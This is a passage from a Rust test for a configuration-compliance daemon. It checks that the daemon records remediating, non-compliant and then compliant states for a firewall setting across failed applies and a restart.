    daemon.result(
        "capabilities.set",
        Some(json!({"capability": "security.firewall", "desired_state": "enabled"})),
    );
    daemon.mock.set_state(json!("disabled"));
    daemon.mock.fail_next_applies(true);
    for _ in 0..3 {
        daemon.result("reconcile", None);
    }
    assert_eq!(changes(&daemon), ["remediating", "non_compliant"]);
    daemon.stop();

    // Healed while punard was down: the first pass records the recovery.
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
    let recorded = changes(&daemon);
    assert_eq!(
        recorded.last().map(String::as_str),
        Some("compliant"),
        "{recorded:?}"
    );
    daemon.result("reconcile", None);
    assert_eq!(changes(&daemon), recorded, "once");
}
